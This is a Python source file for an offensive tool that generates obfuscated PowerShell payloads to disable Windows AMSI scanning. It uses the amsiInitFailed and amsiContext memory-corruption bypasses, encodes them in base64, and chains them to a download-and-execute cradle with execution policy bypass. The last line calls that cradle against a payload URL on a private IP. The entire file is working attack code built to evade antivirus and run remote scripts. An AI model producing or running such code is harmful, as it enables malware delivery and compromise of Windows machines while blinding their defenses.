import os,subprocess,base64,random,glob
import pandas as pd

class AmsiBypass:

    def __init__(self):
        self.tech = input("Encryption level ? (strong/moderate/weak) :")
        self.payload = ""

    def copy_clip(self,data):
        df=pd.DataFrame([data])
        df.to_clipboard(index=False,header=False)
        print("Registered in the clipboard")

    def encode_pws(self,chaine):
        return f"Iex([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{base64.b64encode(chaine.encode()).decode()}')))"

    def obfu_one(self,i):
        liste_index = [j for j in range(len(i))]
        random.shuffle(liste_index)
        liste_dispo = ["_" for j in range(1000000)]
        for index,k in enumerate(liste_index):
            liste_dispo[k] = i[index]
        liste_dispo = "".join(liste_dispo).replace("_","")
        chaine = "'"
        for index in liste_index:
            chaine+="{"+str(index)+"}"
        chaine+="' -f "
        for dispo in liste_dispo:
            chaine += "'"+str(dispo)+"'"+","
        chaine = list(chaine)
        chaine.pop(-1)
        chaine = "("+"".join(chaine)+")"
        return chaine

    def obfuscate(self,command_in):
        command_origin = command_in
        command = []
        commands = command_in.split('"')
        for i in commands:
            if "amsi" in i.lower():
                command.append(i)
        dico_to_replace={}
        for i in command:
            chaine = self.obfu_one(i)
            dico_to_replace[i]=chaine
        for i in dico_to_replace.keys():
            if i in command_origin:
                command_origin = command_origin.replace('"'+i+'"',dico_to_replace[i])

        if self.tech.lower() == "strong":
            command = self.encode_pws(command_origin)
            command = command.split("'")
            command[1] = self.obfu_one(command[1])
            return "".join(command)
        elif self.tech.lower() == 'moderate':
            return self.encode_pws(command_origin)
        else:
            return command_origin

    def matt_graeber_one(self):
        method = '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)'
        self.payload = method
        return self.obfuscate(method)


    def crash_method(self):
        method = '$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)'
        self.payload = method
        return self.obfuscate(method)

    def random_amsi_bypass(self):
        methods = [self.matt_graeber_one(),self.crash_method()]
        methods_name = ["Matt Graeber One","Crash Method"]
        method = random.choice(methods)
        print(f"Using : {methods_name[methods.index(method)]}")
        to_return = method
        return to_return

    def _execute_cmd_bypamsi(self,cmd):
        amsi_bypass = '$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)'
        return self.random_amsi_bypass()+";"+self.encode_pws(self.obfuscate(cmd))

    def download_and_execute_ps1(self,url):
        payload = self.encode_pws(f'Iex(New-Object Net.WebClient).DownloadString(\'{url}\');')
        payload = "powershell.exe -exec bypass -C "+'"'+self._execute_cmd_bypamsi(payload)+'"'
        if input("Do you want to display the payload ? (y/n) :").lower()=="y":
            return payload
        elif input("Do you want to copy the payload into the clipboard ? (y/n) :").lower()=="y":
            self.copy_clip(payload)
            return "Done !"
        else:
            return "Payload not registered"

o = AmsiBypass()
print(o.download_and_execute_ps1("http://192.168.31.142/payload.ps1"))
#print(o.random_amsi_bypass())
#o.copy_clip(o.random_amsi_bypass())
